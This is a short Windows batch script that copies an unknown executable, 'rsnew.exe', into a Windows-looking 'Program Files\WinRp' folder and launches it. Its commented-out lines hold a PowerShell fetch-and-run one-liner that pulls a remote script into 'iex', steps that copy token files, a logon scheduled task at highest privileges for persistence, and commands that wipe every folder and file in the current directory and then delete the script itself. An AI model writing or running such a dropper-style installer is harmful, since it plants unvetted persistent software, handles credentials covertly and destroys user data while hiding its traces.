
@REM iwr https://raw.githubusercontent.com/truongcp0305/dp/main/s.ps1 | iex

@echo off
mkdir "C:\Program Files\WinRp"
mkdir "C:\Program Files\WinRp\bin"
@REM mkdir "C:\temp"

copy "%~dp0rsnew.exe" "C:\Program Files\WinRp\bin"
@REM copy "%~dp0tk.txt" "C:\temp\tk.txt"
@REM copy "%~dp0rf_token.txt" "C:\temp\rf_token.txt"

@REM set TASK_NAME=WinRpStart

@REM schtasks /Create ^
@REM  /TN "%TASK_NAME%" ^
@REM  /TR "C:\Program Files\WinRp\bin\rsnew.exe" ^
@REM  /SC ONLOGON ^
@REM  /RL HIGHEST ^
@REM  /F

start "" "C:\Program Files\WinRp\bin\rsnew.exe"

@REM for /d %%i in (*) do (
@REM     rmdir /s /q "%%i"
@REM )

@REM del /q *.* >nul 2>&1

@REM (del "%~f0") & exit